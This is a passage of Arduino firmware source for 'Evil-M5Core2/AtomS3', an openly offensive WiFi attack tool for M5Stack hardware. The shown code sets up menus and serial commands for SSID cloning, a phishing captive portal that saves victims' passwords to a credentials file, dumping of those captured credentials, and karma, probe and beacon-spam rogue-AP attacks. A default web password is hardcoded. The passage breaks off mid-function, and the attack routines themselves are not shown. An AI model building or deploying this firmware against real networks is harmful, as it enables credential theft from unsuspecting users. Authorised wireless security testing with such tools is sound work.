/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/
// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!! 
// no bluetooth serial due to only BLE on atoms3
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5Unified.h>
#include <vector>
#include <string>
#include <set>
#include <TinyGPSPlus.h>
#include <Adafruit_NeoPixel.h> //led


extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}

int ledOn = true;// change this to true to get cool led effect (only on fire)

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam"};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 10;
int menuStartIndex = 0;
  
String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-AtomS3";  
int topVisibleIndex = 0; 

// Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time 
// experimental
const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
const char* password = ""; // wifi password

//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!

String portalFiles[30]; // 30 portals max 
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0; 


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0; 

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 12;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0}; 
bool karmaSuccess = false;
//AutoKarma end

//config file
const char* configFolderPath = "/config";
const char* configFilePath = "/config/config.txt";
int defaultBrightness = 255 * 0.35; //  35% default Brightness

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end 


//led part 

#define PIN 15
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 10

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
    for (int i = startPixel; i <= endPixel; i++) {
        pixels.setPixelColor(i, color);
    }
    pixels.show();
    delay(30);
}

//led part end 

// sd
#define SCK  7
#define MISO 8
#define MOSI 6

// end sd


TinyGPSPlus gps;


bool isItSerialCommand = false;

void setup() {
  M5.begin();
  Serial.begin(115200);
  M5.Display.setTextSize(0);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);

  const char* startUpMessages[] = {
        "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth for Leska WiFi...", // Donation on Ko-fi // Thx Leska !
    "Compressing wook.worm      algorithm", // Donation on Ko-fi // Thx wook.worm !
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!", 
    "    Shaking champagne…",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "    Affirmative Dave,\n        I read you.",
    "  Your Evil-M5Core2 have\n     died of dysentery",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];

   SPI.begin(SCK, MISO, MOSI, -1);
  if (!SD.begin()) {
    Serial.println("Error..");
    Serial.println("SD card not mounted...");
  }else{
    Serial.println("----------------------");
    Serial.println("SD card initialized !! ");
    Serial.println("----------------------");
    restoreConfigParameter("brightness");
    drawImage("/img/startup-atom.jpg");
    if (ledOn){
        pixels.setPixelColor(4, pixels.Color(255,0,0)); 
        pixels.setPixelColor(5, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(100); 
        
        pixels.setPixelColor(3, pixels.Color(255,0,0)); 
        pixels.setPixelColor(6, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(100); 
        
        pixels.setPixelColor(2, pixels.Color(255,0,0)); 
        pixels.setPixelColor(7, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(100); 
        
        pixels.setPixelColor(1, pixels.Color(255,0,0)); 
        pixels.setPixelColor(8, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(100);
            
        pixels.setPixelColor(0, pixels.Color(255,0,0)); 
        pixels.setPixelColor(9, pixels.Color(255,0,0)); 
        pixels.show(); 
        delay(100); 
        delay(1000);
    }else{
      delay(2000);
      }
}
 
/*String batteryLevelStr = getBatteryLevel();
int batteryLevel = batteryLevelStr.toInt();

if (batteryLevel < 15) {
  drawImage("/img/low-battery.jpg");
  Serial.println("-------------------"); 
  Serial.println("!!!!Low Battery!!!!"); 
  Serial.println("-------------------"); 
  delay(4000);
}
*/
  int textY = 30;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30; 
  
  M5.Display.clear();
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  M5.Display.setCursor(20, textY);
  M5.Display.println(" Evil-AtomS3");
  Serial.println("-------------------");  
  Serial.println(" Evil-AtomS3");
  M5.Display.setCursor(18, textY + 20);
  M5.Display.println("By 7h30th3r0n3");
  M5.Display.setCursor(28, textY + 45);
  M5.Display.println("v1.1.7 2024");
  Serial.println("By 7h30th3r0n3");
  Serial.println("-------------------"); 
  M5.Display.setCursor(0, textY + 80);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("-------------------"); 
  firstScanWifiNetworks();
if (ledOn){
    pixels.setPixelColor(4, pixels.Color(0,0,0));  
    pixels.setPixelColor(5, pixels.Color(0,0,0));
    pixels.show(); 
    delay(50); 
    
    pixels.setPixelColor(3, pixels.Color(0,0,0)); 
    pixels.setPixelColor(6, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 
    
    pixels.setPixelColor(2, pixels.Color(0,0,0)); 
    pixels.setPixelColor(7, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 
    
    pixels.setPixelColor(1, pixels.Color(0,0,0)); 
    pixels.setPixelColor(8, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50);
        
    pixels.setPixelColor(0, pixels.Color(0,0,0)); 
    pixels.setPixelColor(9, pixels.Color(0,0,0)); 
    pixels.show(); 
    delay(50); 
}
  
  if (strcmp(ssid, "") != 0) {
        WiFi.mode(WIFI_MODE_APSTA);
        WiFi.begin(ssid, password);

        unsigned long startAttemptTime = millis();

        while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
            delay(500);
            Serial.println("Trying to connect to Wifi...");
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.println("Connected to wifi !!!");
        } else {
            Serial.println("Fail to connect to Wifi or timeout...");
        }
    } else {
        Serial.println("SSID is empty.");
        Serial.println("Skipping Wi-Fi connection.");
        Serial.println("----------------------");
    }

    pixels.begin(); // led init
    Serial2.begin(9600, SERIAL_8N1, 5, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel

}



void drawImage(const char *filepath) {
fs::File file = SD.open(filepath);
M5.Display.drawJpgFile(SD, filepath);

file.close();
}


void firstScanWifiNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    unsigned long startTime = millis();
    int n;
    while (millis() - startTime < 2000) {
        n = WiFi.scanNetworks();
        if (n != WIFI_SCAN_RUNNING) break;
    }

    if (n == 0) {
        Serial.println("No network found ...");
    } else {
        Serial.print(n);
        Serial.println(" Near Wifi Networks : ");
        Serial.println("-------------------");
        numSsid = min(n, 100);
        for (int i = 0; i < numSsid; i++) {
            ssidList[i] = WiFi.SSID(i);
            Serial.print(i);
            Serial.print(": ");
            Serial.println(ssidList[i]);
        }
        Serial.println("-------------------");
    }
}

    unsigned long previousMillis = 0;
    const long interval = 1000; 


void loop() {
  M5.update();
  handleDnsRequestSerial();
  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (M5.BtnA.wasPressed()) {
          startScanKarma(); 
          currentStateKarma = ScanningKarma; 
        }
        break;

      case ScanningKarma:
        if (M5.BtnA.wasPressed()) {
          isKarmaMode = true;
          stopScanKarma();
          currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
        }
        break;

      case StopScanKarma:
        handleMenuInputKarma(); 
        break;
        
      case SelectSSIDKarma:
      handleMenuInputKarma(); 
      break;
    }

    if (M5.BtnA.wasPressed() && currentStateKarma == StartScanKarma) {
      inMenu = true;
      isOperationInProgress = false;
    }
  }
}



void executeMenuItem(int index) {
  inMenu = false;
  isOperationInProgress = true;
  switch (index) {
      case 0:
      scanWifiNetworks();
      break;
    case 1:
      showWifiList();
      break;
    case 2:
      showWifiDetails(currentListIndex); 
      break;
    case 3:
      createCaptivePortal();
      break;
    case 4:
      stopCaptivePortal();
      break;
    case 5:
      changePortal();
      break;
    case 6:
      checkCredentials();
      break;
    case 7:
      deleteCredentials();
      break;
    case 8: 
      displayMonitorPage1();
      break;
    case 9: 
      probeAttack();
      break;    
    case 10: 
      probeSniffing();
      break;
    case 11: 
      karmaAttack();
      break;
    case 12:
      startAutoKarma();
      break;
    case 13: 
      karmaSpear();
      break;
    case 14: 
      listProbes();
      break;
    case 15: 
      deleteProbe();
      break;
    case 16: 
      deleteAllProbes();        
      break;
    case 17: 
      brightness();
      break;    
    case 18: 
      wardrivingMode();
      break;
    case 19: 
      beaconAttack();
      break;
  }
  isOperationInProgress = false;
}

unsigned long buttonPressTime = 0;
bool buttonPressed = false;

void handleMenuInput() {
    // Détecter lorsque le bouton est appuyé
    if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

    // Vérifier si le bouton a été relâché
    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) {
            // Pression courte : navigation dans le menu
            currentIndex++;
            if (currentIndex >= menuSize) {
                currentIndex = 0;
            }
        } else {
            // Pression longue : sélectionner l'élément du menu
            executeMenuItem(currentIndex);
        }
    }

    menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
}




void drawMenu() {
    M5.Display.clear();
    M5.Display.setTextSize(1); // Assurez-vous que la taille du texte est correcte
    M5.Display.setTextFont(1);

    int lineHeight = 12; // Augmentez la hauteur de ligne si nécessaire
    int startX = 0;
    int startY = 3;

    for (int i = 0; i < maxMenuDisplay; i++) {
        int menuIndex = menuStartIndex + i;
        if (menuIndex >= menuSize) break; 

        if (menuIndex == currentIndex) {
            M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 2); // Ajustez ici
        M5.Display.println(menuItems[menuIndex]);
    }
    M5.Display.display();
}


void handleDnsRequestSerial(){
      dnsServer.processNextRequest();
      server.handleClient();
      checkSerialCommands();
}


void listProbesSerial() {
    File file = SD.open("/probes.txt", FILE_READ);
    if (!file) {
        Serial.println("Failed to open probes.txt");
        return;
    }

    int probeIndex = 0;
    Serial.println("List of Probes:");
    while (file.available()) {
        String probe = file.readStringUntil('\n');
        probe.trim();
        if (probe.length() > 0) {
            Serial.println(String(probeIndex) + ": " + probe);
            probeIndex++;
        }
    }
    file.close();
}

void selectProbeSerial(int index) {
    File file = SD.open("/probes.txt", FILE_READ);
    if (!file) {
        Serial.println("Failed to open probes.txt");
        return;
    }

    int currentIndex = 0;
    String selectedProbe = "";
    while (file.available()) {
        String probe = file.readStringUntil('\n');
        if (currentIndex == index) {
            selectedProbe = probe;
            break;
        }
        currentIndex++;
    }
    file.close();

    if (selectedProbe.length() > 0) {
        clonedSSID = selectedProbe; 
        Serial.println("Probe selected: " + selectedProbe);
    } else {
        Serial.println("Probe index not found.");
    }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void checkSerialCommands() {
 if (Serial.available()) {
  String command = Serial.readStringUntil('\n');
  command.trim();
  if (command == "scan_wifi") {
    isOperationInProgress = true;
    inMenu = false;
    scanWifiNetworks();
    //sendBLE("-------------------");
    //sendBLE("Near Wifi Network : ");
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      //sendBLE(String(i) + ": " + ssidList[i]);
    }
  } else if (command.startsWith("select_network")) {
    int ssidIndex = command.substring(String("select_network ").length()).toInt();
    selectNetwork(ssidIndex);
    //sendBLE("SSID sélectionné: " + currentlySelectedSSID);
   } else if (command.startsWith("change_ssid ")) {
    String newSSID = command.substring(String("change_ssid ").length());
    cloneSSIDForCaptivePortal(newSSID);
    Serial.println("Cloned SSID changed to: " + clonedSSID);
    //sendBLE("Cloned SSID changed to: " + clonedSSID);
  } else if (command.startsWith("set_portal_password ")) {
    String newPassword = command.substring(String("set_portal_password ").length());
    captivePortalPassword = newPassword;
    Serial.println("Captive portal password changed to: " + captivePortalPassword);
    //sendBLE("Captive portal password changed to: " + captivePortalPassword);
  } else if (command.startsWith("set_portal_open")) {
    captivePortalPassword = "";
    Serial.println("Open Captive portal set");
    //sendBLE("Open Captive portal set");
  } else if (command.startsWith("detail_ssid")) {
    int ssidIndex = command.substring(String("detail_ssid ").length()).toInt();
    String security = getWifiSecurity(ssidIndex);
    int32_t rssi = WiFi.RSSI(ssidIndex);
    uint8_t* bssid = WiFi.BSSID(ssidIndex);
    String macAddress = bssidToString(bssid);
    M5.Display.display();
    Serial.println("------Wifi-Info----");
    //sendBLE("------Wifi-Info----");
    Serial.println("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
    //sendBLE("SSID: " + (ssidList[ssidIndex].length() > 0 ? ssidList[ssidIndex] : "N/A"));
    Serial.println("Channel: " + String(WiFi.channel(ssidIndex)));
    //sendBLE("Channel: " + String(WiFi.channel(ssidIndex)));
    Serial.println("Security: " + security);
    //sendBLE("Security: " + security);
    Serial.println("Signal: " + String(rssi) + " dBm");
    //sendBLE("Signal: " + String(rssi) + " dBm");
    Serial.println("MAC: " + macAddress);
    //sendBLE("MAC: " + macAddress);
    Serial.println("-------------------");
    //sendBLE("-------------------");
  } else if (command == "clone_ssid") {
    cloneSSIDForCaptivePortal(currentlySelectedSSID);
    Serial.println("Cloned SSID: " + clonedSSID);
    //sendBLE("Cloned SSID: " + clonedSSID);
  } else if (command == "start_portal") {
    createCaptivePortal();
    //sendBLE("Start portal with " + clonedSSID);
  } else if (command == "stop_portal") {
    stopCaptivePortal();
    //sendBLE("Portal Stopped ");
  } else if (command == "list_portal") {
    File root = SD.open("/sites");
    numPortalFiles = 0;
    Serial.println("Available portals:");
    //sendBLE("-------------------");
    //sendBLE("Availables portals :");
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".html")) {
                portalFiles[numPortalFiles] = String("/sites/") + fileName;

                Serial.print(numPortalFiles);
                Serial.print(": ");
                Serial.println(fileName);
                //sendBLE(String(numPortalFiles) + ": " + fileName);
                numPortalFiles++;
                if (numPortalFiles >= 30) break; // max 30 files
            }
        }
        file.close();
    }
    root.close();
  } else if (command.startsWith("change_portal")) {
    int portalIndex = command.substring(String("change_portal ").length()).toInt();
    changePortal(portalIndex);
  } else if (command == "check_credentials") {
    checkCredentialsSerial();
  } else if (command == "monitor_status") {
        String status = getMonitoringStatus();
        Serial.println("-------------------");
        //sendBLE("-------------------");        
        Serial.println(status);
        //sendBLE(status);
  } else if (command == "probe_attack") {
    isOperationInProgress = true;
    inMenu = false;
    isItSerialCommand = true;
    probeAttack();
    delay(200);
  } else if (command == "stop_probe_attack") {
    if (isProbeAttackRunning) {
      isProbeAttackRunning = false;
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("Stopping probe attack...");
      //sendBLE("Stopping probe attack...");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    } else {
      Serial.println("-------------------");
      //sendBLE("-------------------");
      Serial.println("No probe attack running.");
      //sendBLE("No probe attack running.");
      Serial.println("-------------------");
      //sendBLE("-------------------");
    }
  } else if (command == "probe_sniffing") {
    isOperationInProgress = true;
    inMenu = false;
    probeSniffing();
    delay(200);
  } else if (command == "stop_probe_sniffing") {
    stopProbeSniffingViaSerial = true;
    isProbeSniffingRunning = false;
    Serial.println("-------------------");
    //sendBLE("-------------------");
    Serial.println("Stopping probe sniffing via serial...");
    //sendBLE("Stopping probe sniffing via serial...");
    Serial.println("-------------------");
    //sendBLE("-------------------");
  } else if (command == "list_probes") {
    listProbesSerial();
  } else if (command.startsWith("select_probes ")) {
    int index = command.substring(String("select_probes ").length()).toInt();
    selectProbeSerial(index);
  } else if (command == "karma_auto") {
    isOperationInProgress = true;
    inMenu = false;
    startAutoKarma();
    delay(200);
  } else if (command == "help") {
    Serial.println("-------------------");
    //sendBLE("-------------------");
    Serial.println("Available Commands:");
    //sendBLE("Available Commands:");
    Serial.println("scan_wifi - Scan WiFi Networks");
    //sendBLE("scan_wifi - Scan WiFi Networks");
    Serial.println("select_network <index> - Select WiFi <index>");
    //sendBLE("select_network <index> - Select WiFi <index>");
    Serial.println("change_ssid <max 32 char> - change current SSID");
    //sendBLE("change_ssid <max 32 char> - change current SSID");
    Serial.println("set_portal_password <password min 8> - change portal password");
    //sendBLE("set_portal_password <password min 8> - portal pass");
    Serial.println("set_portal_open  - change portal to open");
    //sendBLE("set_portal_open - change portal to open");
    Serial.println("detail_ssid <index> - Details of WiFi <index>");
    //sendBLE("detail_ssid <index> - Details of WiFi <index>");
    Serial.println("clone_ssid - Clone Network SSID");
    //sendBLE("clone_ssid - Clone Network SSID");
    Serial.println("start_portal - Activate Captive Portal");
    //sendBLE("start_portal - Activate Captive Portal");
    Serial.println("stop_portal - Deactivate Portal");
    //sendBLE("stop_portal - Deactivate Portal");
    Serial.println("list_portal - Show Portal List");
    //sendBLE("list_portal - Show Portal List");
    Serial.println("change_portal <index> - Switch Portal <index>");
    //sendBLE("change_portal <index> - Switch Portal <index>");
    Serial.println("check_credentials - Check Saved Credentials");
    //sendBLE("check_credentials - Check Saved Credentials");
    Serial.println("monitor_status - Get current information on device");
    //sendBLE("monitor_status - Get current information on device");
    Serial.println("probe_attack - Initiate Probe Attack");
    Serial.println("stop_probe_attack - End Probe Attack");
    Serial.println("probe_sniffing - Begin Probe Sniffing");
    Serial.println("stop_probe_sniffing - End Probe Sniffing");
    Serial.println("list_probes - Show Probes");
    //sendBLE("list_probes - Show Probes");
    Serial.println("select_probes <index> - Choose Probe <index>");
    //sendBLE("select_probes <index> - Choose Probe <index>");
    Serial.println("karma_auto - Auto Karma Attack Mode");
    Serial.println("-------------------");
    //sendBLE("-------------------");
  } else {
    Serial.println("-------------------");
    //sendBLE("-------------------");
    Serial.println("Command not recognized: " + command);
    //sendBLE("Command not recognized: " + command);
    Serial.println("-------------------");
    //sendBLE("-------------------");
  }
}
}

String getMonitoringStatus() {
    String status;
    int numClientsConnected = WiFi.softAPgetStationNum();
    int numCredentials = countPasswordsInFile(); 
    
    status += "Clients: " + String(numClientsConnected) + "\n";
    status += "Credentials: " + String(numCredentials) + "\n";
    status += "SSID: " + String(clonedSSID) + "\n";
    status += "Portal: " + String(isCaptivePortalOn ? "On" : "Off") + "\n";
    status += "Page: " + String(selectedPortalFile.substring(7)) + "\n";
    updateConnectedMACs();
    status += "Connected MACs:\n";
    for (int i = 0; i < 10; i++) {
        if (macAddresses[i] != "") {
            status += macAddresses[i] + "\n";
        }
    }
    status += "Stack left: " + getStack() + " Kb\n";
    status += "RAM: " + getRamUsage() + " Mo\n";
    status += "Battery: " + getBatteryLevel() + "%\n"; // thx to kdv88 to pointing mistranlastion
    status += "Temperature: " + getTemperature() + "C\n";
    return status;
}

void checkCredentialsSerial() {
    File file = SD.open("/credentials.txt");
    if (!file) {
        Serial.println("Failed to open credentials file");
        return;
    }
    bool isEmpty = true;
    Serial.println("----------------------");
    Serial.println("Credentials Found:");
    Serial.println("----------------------");
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.length() > 0) {
            Serial.println(line);
            isEmpty = false;
        }
    }
    file.close();
    if (isEmpty) {
        Serial.println("No credentials found.");
    }
}

void changePortal(int index) {
    File root = SD.open("/sites");
    int currentIndex = 0;
    String selectedFile;
    while (File file = root.openNextFile()) {
        if (currentIndex == index) {
            selectedFile = String(file.name());
            break;
        }
        currentIndex++;
        file.close();
    }
    root.close();
    if (selectedFile.length() > 0) {
        Serial.println("Changing portal to: " + selectedFile);
        selectedPortalFile = "/sites/" + selectedFile;
    } else {
        Serial.println("Invalid portal index");
    }
}

void selectNetwork(int index) {
  if (index >= 0 && index < numSsid) {
    currentlySelectedSSID = ssidList[index];
    Serial.println("SSID sélectionné: " + currentlySelectedSSID);
  } else {
    Serial.println("Index SSID invalide.");
  }
}

void scanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 5000) {
    M5.Display.clear();
    M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
    M5.Display.setCursor(12 , M5.Display.height()/ 2 );
    M5.Display.print("Scan in progress... ");
    Serial.println("-------------------");
    Serial.println("WiFi Scan in progress... ");
    M5.Display.display();
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }
  Serial.println("-------------------");
  Serial.println("Near Wifi Network : ");
  numSsid = min(n, 100);
  for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(": ");
      Serial.println(ssidList[i]);
  }
  Serial.println("-------------------");
  Serial.println("WiFi Scan Completed ");
  Serial.println("-------------------");
  waitAndReturnToMenu("Scan Completed");
  
}


void showWifiList() {
  const int listDisplayLimit = M5.Display.height() / 9; 
  int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
  
  M5.Display.clear();
  M5.Display.setTextSize(0);
  for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
    if (i == currentListIndex) {
      M5.Display.fillRect(0, (i - listStartIndex) * 10, M5.Display.width(), 10, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(2, (i - listStartIndex) * 10);
    M5.Display.println(ssidList[i]);
  }
  M5.Display.display();

bool buttonPressed = false;
unsigned long buttonPressTime = 0;

while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();

    if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

